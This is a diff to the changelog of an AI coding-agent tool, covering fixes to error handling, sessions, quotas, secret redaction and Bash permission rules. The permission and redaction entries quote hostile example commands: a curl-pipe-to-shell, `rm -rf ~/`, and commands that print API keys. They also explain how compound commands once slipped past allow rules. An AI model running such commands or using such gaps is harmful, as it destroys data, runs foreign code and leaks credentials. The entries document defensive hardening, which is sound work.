@@ -88,6 +88,152 @@ All notable changes to this project are documented in this file.
 
 ### Fixed
 
+- **A router's one-line "[Error] The model failed to generate a response." is re-issued, not
+  counted as an answer** (#404). A router sends that sentence as the whole reply when its upstream
+  fails, and Book's check for an upstream error envelope, which leans on the token usage reported
+  beside it, did not recognise it: the run ended `completed / normal_completion` on a reply with no
+  work in it. The router's exact sentence is now taken for an envelope whatever the usage says, and
+  the turn is re-issued once. If it comes back, the run ends `failed / provider_error` with provider
+  code `error_envelope`. A model's own one-line `[Error]` answer in other words is still an answer.
+- **A tool call whose arguments arrive empty is a retryable route fault, not the model's** (#403).
+  Some routes stream a tool call with an empty argument string. Book read it as `{}` and rejected it
+  as `invalid_arguments`, which was not retryable, told the model "Do not retry it unchanged" from
+  the second try, and ended on `all_tools_blocked` blaming the model. A call whose arguments, joined
+  across every fragment, are empty or whitespace is now marked as arriving empty on the wire. For a
+  tool with required properties the registry rejects it as `invalid_json_arguments` with shape
+  `empty`: retryable, blamed on the route, exempt from "Do not retry it unchanged", and counted by
+  `book tool-stats`. A literal `{}` is not marked, and a tool with no required arguments still runs
+  with `{}`. When `all_tools_blocked` ends a streak in which every call arrived empty, the stop now
+  names the provider route and says the model is not at fault; a streak that also holds a malformed
+  call keeps the old text.
+- **An HTTP error whose body never arrived no longer reads "(empty response body)"** (#449). A read
+  that timed out, failed or was aborted before a single byte arrived was reported with the same
+  words as a response that really was empty, so a stalled router and an empty 404 looked alike. The
+  first now says "no response body received", also after the retries are exhausted; a null or
+  completed-empty body still reads "(empty response body)", and partial text is kept. A body that
+  says nothing useful (Go's `404 page not found`, `{}` or `[]`, an HTML page) keeps its text and
+  gains "The reply came from <host> for model <model>.", with an HTML page shown as its title. Only
+  the host is named, never userinfo, path or query.
+- **Tool call ids stay unique across a conversation** (#410). A provider can return an id it used in
+  an earlier turn: 9router's `ag/` route mints `call_` plus seven digits, and one session collided
+  at its 140th call. Book saved both calls, so every later request, and every `--resume`, carried
+  two calls with one id, which Gemini refuses with `400 INVALID_ARGUMENT` for good. A streamed call
+  whose id is already in the conversation is now renamed before it is announced, run or saved:
+  `call_1` becomes `call_1_2`, the smallest suffix not in use, and its result and any Anthropic
+  `tool_use` block carry the new id. A session that already holds a repeat resumes instead of
+  failing: when its messages are built the first use keeps its id and each later one is renamed the
+  same way every time, so earlier turns render byte for byte and the prompt cache holds. The session
+  file is not rewritten. A batch that repeats an id within one response is still rejected, and its
+  rejected message no longer keeps the Anthropic `tool_use` blocks that every later request would
+  have replayed.
+- **A disposed manager keeps the record it wrote, and a contended state write is retried once**
+  (#490, #493). When the session closed while a child agent was running, the child's run could still
+  overwrite the `interrupted / process_exit` record that `dispose()` had written with `stopped`,
+  `failed` or `completed`. A disposed manager's run now returns straight after its loop, the
+  record-changing callbacks go quiet, and the store refuses a save after dispose (its own final
+  flush still goes through); the transcript the loop added after its last save is dropped, as a
+  process exit would drop it. Separately, an atomic state-file write whose lock and fsyncs had used
+  up its 500 ms deadline returned `busy` on the first contended rename without trying again. That
+  first contended rename now always gets a back-off and one more attempt, which still honours
+  cancellation and a disposed store. A second contention follows the normal deadline rule and
+  returns `busy`.
+- **Cancelling, stopping or closing a session now stops an apply that is already running** (#491).
+  An apply's signing read, and the operator's `gpg.ssh.defaultKeyCommand` inside it, took no signal,
+  so a `/review --fix` cancel, `AgentStop` or `dispose()` left that command running for up to its
+  30 s bound. The signal now reaches the candidate lookup, the git version and signing-config reads
+  and the key command, which is killed at once. `dispose()` stops only those reads: a cherry-pick
+  already running when the session closes finishes, as it did before, rather than being killed with
+  no rollback. A stop during the pre-check, the cherry-pick or the dirty-path `git apply` used to be
+  reported as a conflict; it now ends with an error that names the stop and what it left, whether
+  the rollback ran and any unmerged paths, and `/review --fix` counts that pass as cancelled
+  ("Stopped while applying …"), not as a failed fix. `AgentStop` waits for the apply it stopped,
+  rollback included, and a patcher that had completed stays `completed`. `AgentStop` on a completed
+  agent also stops an apply you started yourself, and its own result does not say so.
+- **Print mode and the SDK keep a session's name across managed-agent completions, and `/review`
+  agents are recorded under the host session** (#446, #448). A managed agent's completion notice
+  (and a background shell's, in the TUI) is a host-written turn, yet it named a session that had no
+  name yet, as `Atlas completed: Found the missing de…`, in place of the prompt you typed. A
+  notification turn now never derives or changes a name, in print mode, the SDK, the session index
+  and the loader alike. In print mode and the SDK the `/review` reviewers, and the `--fix` patcher
+  and validator, recorded `sessionId: "agent:<id>"` in tool telemetry, so five reviewers counted as
+  five sessions in `book tool-stats`; they now carry the host's session id. That also puts the
+  host's `parent_session_id` in their SubagentStart and SubagentStop hook payloads, and a print-mode
+  session resumed in the TUI lists its review agents in the agent panel, as TUI `/review` agents
+  already do.
+- **An empty session is removed when Book exits before the first prompt** (#444, #507). Opening Book
+  and quitting left a session file and an index entry behind (#428 only hid them), and so did `/new`
+  or `/clear` followed by quitting. At exit Book now removes the session this launch created, and
+  each one `/new` or `/clear` created, if it is still untouched: its file holds at most the bare
+  header and has no name. A turn, a patch, a usage record, or a line a SessionEnd hook wrote keeps
+  it, and a resumed, continued or `/resume`d session is never removed. This covers the TUI, print
+  mode and the SDK. A launch with `--name` that sends no prompt is kept, since you typed the name
+  and `--resume <name>` finds it. Windows may briefly hold the file open, which leaves it in place.
+- **Two Ctrl+C presses read together count as two presses, so quitting right after launch works**
+  (#504). Ink hands bytes read in one stdin chunk on as a single event, and Book did not recognise
+  `\x03\x03` as Ctrl+C. Right after the first frame Book stalls for 200 to 700 ms while the agent
+  store opens, so a quit's two presses were read as one chunk and ignored: about two in ten driver
+  runs that quit at once did not exit. Every Ctrl+C is now split out of a chunk before any key
+  handler sees it, one piece per tick, so two presses over a draft clear it and then arm the exit
+  window, as two separate presses do. Text and Enter that arrive in one read are still a paste, on
+  purpose. Limit: the stall is still there (#516), and an Enter sent during it can still be merged
+  into a paste.
+- **A `/goal` session name keeps a leading inline code span** (#449). The name came from the goal
+  with one leading backtick stripped, so a goal that began with `npm test` as an inline code span
+  lost the span's opening backtick and had its first letter capitalised. The span is kept. A
+  leading code fence and its language tag are still dropped, a word after a fence counting as a tag
+  only when a newline follows it, as are a trailing closing fence and a fence line in the middle of
+  the prompt. Limit: a prompt-body command (`/init`, a custom command, a skill) and the plan handoff
+  still name the session after the text they generate.
+- **Grep accepts ripgrep inline flags such as `(?i)`, and tool output blocks draw empty lines**
+  (#447, #494). Grep compiled the pattern with JavaScript's `RegExp` before choosing a backend, so
+  `(?i)HELLO` failed with "Invalid group" although ripgrep takes it. The pattern now goes to
+  ripgrep as written. The portable fallback translates a leading `(?i)`, `(?s)` or `(?m)` group
+  into `RegExp` flags without repeating one already set, except that in line mode a leading `(?m)`
+  or `(?s)` is not made a flag, since it would match `foo\r` on a CRLF file where ripgrep does not.
+  Any other inline group, such as `(?x)` or a `(?i)` in mid-pattern, fails with `invalid_regex`
+  naming the construct and pointing to `i: true`. When ripgrep exits 2 on a regex parse error Grep
+  still falls back to the portable engine, so lookaround keeps working, and if both reject the
+  pattern the error includes ripgrep's own; any other exit 2 returns ripgrep's result. A malformed
+  pattern now costs one ripgrep spawn before it fails. In the transcript, a tool row's output block
+  dropped empty lines: `printf "S1\n\nS2\n\n\nS3\n"` drew three rows. Each line now draws a row of
+  at least one line. One definition of a tool output's lines, split on `\n` with the trailing empty
+  lines dropped, feeds the drawn rows, the header's line count and the `… +N lines` footers, so
+  `X` and its newline reads 1 line and draws 1 row. This supersedes the #480 note that an empty line
+  between two others adds no row.
+- **`/model` discovery records an Anthropic endpoint's reported context window** (#416). Discovery
+  listed the models but dropped the `max_input_tokens` that `/v1/models` reports, so `/context`
+  kept showing the default window until you set one by hand. It is now stored per model as
+  `reportedContextWindow` when it is a positive whole number, overwritten on every refresh and
+  removed once the endpoint stops reporting it, and `/context` names its source `reported`. The
+  order is a hand-set `contextWindow`, then the learned ceiling, then the reported window, then the
+  model family, then the default. A separate field, rather than `contextWindow`, so that your value
+  always wins and an overflow can still lower a reported window that a proxy or a key tier did not
+  honour. A refresh now updates the running session's model information for that provider; the
+  selection, effort and `maxTokens` are untouched. Limits: only Anthropic endpoints, with an
+  OpenAI-compatible `context_length` ignored and `max_tokens` not recorded. A discovered Haiku 5.5
+  now records its 1M window, so long sessions compact later and, past 100k tokens, cost more per
+  request; set `contextWindow` to lower it.
+- **At `$HOME`, `book config set` and `/config` no longer report a user-scope write as shadowed by
+  the same file** (#449). With `BOOK_HOME` unset, the workspace's `.book/settings.json` is the user
+  file, and a user-scope write was reported as shadowed by the project layer. The project layer is
+  now skipped when it is the user file, as the loader does; the local layer and a `--settings` file
+  are still reported. A home reached through a symlink, with the workspace given by its real path,
+  also listed each user skill root a second time as a project root whose skills ask for consent. A
+  project root whose real path is a user root's is now folded into that user root. Roots that only
+  alias each other, project to project or user to user, are left alone, and a root that does not
+  exist is never folded. Trust does not loosen: with `BOOK_HOME` elsewhere, `~/.book/settings.json`
+  is still a project layer, and its hooks and `permissions.allow` stay withheld.
+- **A persistent background Bash job gets 10 s to start, and shell ids stay unique across resumes**
+  (#495, #449). The detached runner had 3 s to start the job, which a loaded Windows CI runner did
+  not always meet (`did not start within 3000ms`); it has 10 s now. A runner that dies early is
+  still reported at once, and one that hangs is still killed and forgotten after the budget. The
+  wait also ends when the turn is cancelled or the manager is disposed. Separately, `shell_<n>`
+  numbering restarted at `shell_1` after `--resume`, `/resume`, `/rewind`, in print mode and in a
+  managed agent's follow-up run, so a new job could reuse an id that a transcript row or completion
+  notice already named. The counter now starts one past the highest `shell_<n>` in the transcript
+  and in the context history (compaction can drop an id from the history while the row keeps it).
+  After `/rewind` it continues past the ids the kept transcript still holds, and after `/clear` it
+  starts at 1. Persistent `shell_<uuid>` ids and numbers above 1,000,000 are ignored.
 - **A failed command's stdout is named under its stderr, and Ctrl+E reaches the row** (#480). A
   command that failed with output on both streams showed only its stderr tail: an `npm warn` where
   the `FAIL test/a.test.js > expected 1, got 2` that said what broke belonged. The model read both,
@@ -322,12 +468,14 @@ All notable changes to this project are documented in this file.
   `retry.maxDelayMs` on every attempt, then re-issued the turn and repeated the cycle for ~14
   minutes and ~33 requests before claiming a temporary capacity issue for a limit resetting days
   later. An effective 429 whose message states a usage, plan, quota, or subscription limit over a
-  long window was reached, exceeded, or spent — or carrying OpenAI's `insufficient_quota` code —
-  now classifies as `quota`: without `retry.watchdog`, `fetchWithRetry` answers with a single
-  request and the run parks like a 402 (`credentials_rejected`, provider code `quota`). The
-  formatted error names the stated reset time and remedy without temporary capacity advice, while
-  `insufficient_quota` keeps the credits advice. A short window anywhere in the message keeps the
-  error a rate limit. Under `retry.watchdog`, spent-limit 429s are still retried. On any retryable
+  long window was reached, exceeded, or spent now classifies as `usage_limit`: without
+  `retry.watchdog`, `fetchWithRetry` answers with a single request and the run ends
+  `quota_exhausted`, a park (#409). A 429 carrying OpenAI's `insufficient_quota` code is answered
+  once the same way but is about credits, so it classifies as `quota` and parks like a 402
+  (`credentials_rejected`). The formatted error names the stated reset time and remedy without
+  temporary capacity advice, while `insufficient_quota` keeps the credits advice. A short window
+  anywhere in the message keeps the error a rate limit. Under `retry.watchdog`, spent-limit 429s
+  are still retried. On any retryable
   429, an absolute `resets at <time>` within reach is waited for, up to `retry.maxDelayMs` per
   attempt; a reset that falls beyond what the remaining attempts and retry budget can wait halts
   retries immediately.
@@ -395,8 +543,12 @@ All notable changes to this project are documented in this file.
   where its time went: before the child started, or after it finished.
 - **`~/.claude/CLAUDE.md` is injected once for a workspace under your home directory** (#430).
   The instruction walk passes through your home directory, where it found the file a second time
-  as a project-level `.claude/CLAUDE.md`. Instruction files are now deduplicated by resolved path,
-  and the first, user-scoped entry is kept.
+  as a project-level `.claude/CLAUDE.md`. Instruction files are now deduplicated by real path (the
+  link followed, and on Windows the drive-letter case as stored), and the first, user-scoped entry
+  is kept. That also loads `BOOK_HOME/AGENTS.md` once, as yours, when the workspace lies inside
+  `BOOK_HOME`, and counts a home reached through a symlink once, with the workspace given by its
+  real path. A `CLAUDE.md` linked to the `AGENTS.md` beside it loads once, and one linked to
+  `CLAUDE.local.md` loads that file once, at the link's own project position rather than as local.
 - **The agent store no longer logs spurious write retry events for first-try writes** (#402).
   Atomic JSON writes incremented an attempt counter across both lock and rename steps, returning
   two attempts on clean writes and causing the agent store to log a retry event on every success.
@@ -408,6 +560,22 @@ All notable changes to this project are documented in this file.
 
 ### Changed
 
+- **`quota_exhausted` is a new `AgentTerminalReason`: a spent usage limit, or a wait the retries
+  cannot reach, parks the run** (#409). A change for SDK and stream-json consumers that switch over
+  the reason set. A 429 that states a spent usage or plan limit used to park as
+  `credentials_rejected`, which tells an operator to rotate a key, and a stated wait longer than the
+  retries could cover was clamped to `retry.maxDelayMs` and re-sent on every attempt. A spent-limit
+  429 now ends the run `quota_exhausted` (provider code `usage_limit`). A stated wait of 15 minutes
+  or more, from a `Retry-After` header, a router's `(reset after 3h)` or an absolute
+  `resets at <time>`, whichever is longer, that is also longer than the call can still wait (the
+  smaller of the remaining `retry.totalBudgetMs` and the remaining attempts times
+  `retry.maxDelayMs`) is returned after one request and ends the run `quota_exhausted` as well, with
+  provider code `rate_limit_wait`. It is a park like `credentials_rejected`: it is not re-issued and
+  the `Notification` hook alarm carries `kind: "quota_exhausted"`, but the remedy differs, which is
+  to wait for the reset or pick another model with `--model` or `/model`. A 402, OpenAI's
+  `insufficient_quota` and Anthropic's `billing_error` still end `credentials_rejected`. A wait
+  shorter than 15 minutes is always waited for, and `retry.watchdog` keeps waiting whatever the
+  wait. "Long runs" in the guide has the detail.
 - **Breaking: the model writes memory with the file tools, and `MemorySave` is gone.** Memory is
   now one Markdown file per fact in the memory directory (`name`, `description` and
   `metadata.type` frontmatter, a `Why:` and `How to apply:` line for feedback and project
@@ -563,6 +731,65 @@ All notable changes to this project are documented in this file.
   `book trust provider <id>` before it is used, and an approved provider with no key of its own
   sends none, so it fails at startup with the missing-key error until its declaration carries its
   own `apiKey`. A provider you define in `~/.book/settings.json` is unaffected.
+- **Provider requests refuse every HTTP redirect, so your key and prompt stay with the endpoint you
+  configured** (#445). Node's `fetch` follows a 3xx, so a provider endpoint that answered
+  `307 Location: http://other-host/…` had the request re-sent there with its `x-api-key` header and
+  the whole prompt. Every provider request, and `/model` discovery, now fails on any 3xx, with no
+  same-origin exception. The error is not retried, `retry.watchdog` included, and names the status
+  and the target as scheme, host and path only, never userinfo, query or fragment. It advises
+  setting the provider's base URL to that address without the endpoint path Book adds; the usual
+  causes are http to https, a missing `/v1` and a moved host. A compaction that meets a redirect
+  does not fall back to a summary-less one, and a managed agent or the advisor does not re-issue the
+  request. WebFetch keeps its own redirect policy and carries no provider credential.
+- **Tool output no longer carries Book's own provider keys** (#411). A command such as
+  `cat ~/.book/settings.json` or `echo $BOOK_API_KEY` put a configured key into the tool result,
+  and from there into the model's context, the session file, the `tool-output/` spill file and
+  stream-json. Before the output is bounded, each configured provider key and `BOOK_API_KEY` is now
+  replaced with `[redacted: provider key]`, for every tool, `Bash`, `BashOutput`, `Check`, `Read`,
+  MCP and `Task` included, and in the tail a finished background shell sends to the model. A key
+  under 8 characters, the placeholder keys of keyless local endpoints (`lm-studio`, `not-needed`),
+  and the key of a workspace provider you have not approved are not treated as secrets. `Write`,
+  `Edit` and `MultiEdit` refuse (`redacted_secret_overwrite`) to write the marker over a file that
+  holds a real key, so reading a file and writing it back cannot destroy a credential. `BashOutput`
+  on a running job returns text up to the last line break, so a read cannot be used to guess a key
+  one character at a time; an unfinished line waits for its end or for the job to exit, and a line
+  with no break comes back in pieces of at most 1024 characters. Limits: only exact values match,
+  so a key that was encoded or written in separate pieces is not caught; PostToolUse hooks and the
+  log files of background jobs on disk see the raw output; and the environment is unchanged, so
+  Bash children still inherit `BOOK_API_KEY` and a nested `book` run keeps working.
+- **A `Bash(<glob>)` rule in `allowed-tools` no longer admits a compound command** (#478). Such a
+  rule, written in a command, a skill or an agent role, read only the first line of the command and
+  let `;`, `&&`, a pipe, a redirect or a substitution through, so `Bash(git *)` admitted
+  `git status && curl https://example.com/x | sh` and `git log` followed by a line `rm -rf ~/`. The
+  rule now matches the whole trimmed command and refuses one that is compound. The check is a small
+  quote scanner, not a shell parser. Outside quotes, any of `; & | < > $ ( ) { }` or a backtick
+  counts; inside double quotes only `$` and a backtick do; inside single quotes nothing does, so
+  `git commit -m "fix(x): y"` and `git stash show 'stash@{0}'` still pass `Bash(git *)`. It fails
+  closed past that: an unterminated quote, a line break anywhere (even quoted), a backslash before
+  a quote, a `^` before a quote outside quotes, and a typographic quote (U+2018 to U+201E) are all
+  refused, since some shell reads each of them differently. On Windows a single quote is refused,
+  because the session shell may be cmd.exe, where it is not a quote, except under Git Bash (not
+  WSL) in a command that contains a space, a tab or a `"`: the Git Bash runtime strips the quotes
+  from a command without one before bash sees it. This holds for an exact rule and for `Bash(*)`
+  too; a bare `Bash` still admits any command, and the strict `rm` rule is unchanged. The refusal
+  tells the model to send each command as its own Bash call.
+- **Bash permission rules read the whole command, and a compound command asks when a Bash deny or
+  ask rule exists** (#500, #512). A Bash allow rule matched only the first line, so
+  `Bash(git status)` allowed `git status` followed by a second line and `Bash(git *)` allowed
+  `git status && …`, and a deny or ask rule never saw a command chained after the first. A rule
+  with a `*` now matches the whole trimmed command and never admits one the scanner above calls
+  compound, `Bash(*)` included; the call falls through to the normal prompt. A rule with no `*` is
+  exact: it admits a command only when the trimmed command equals it as a plain string, a `?`
+  literal, compound or not, so "Always allow" on `cd x && npm test` writes a rule that fires again.
+  "Always allow" remembers nothing for a multi-line command or a compound one that contains a `*`,
+  since no rule could admit it. A bare `Bash` allow rule still admits everything until a Bash deny
+  or ask rule exists; then a compound command always asks, in `auto` too (`default` and
+  `accept-edits` ask as before, `dontAsk` refuses, and `bypassPermissions` bypasses). A rule on
+  another tool, such as `Read(.env)`, does not trigger that, and only an exact session approve-all
+  rule skips the prompt. In print mode, the SDK and a background agent the refusal says to send each
+  command as its own call, to add the exact rule, or to use `bypassPermissions`. A deny or ask rule
+  now also tests the trimmed command's first line and its whole text, so leading whitespace no
+  longer slides past `Bash(git push *)` into an allow rule. The Windows quote reading above applies.
 
 ## [0.3.0] - 2026-10-07
 
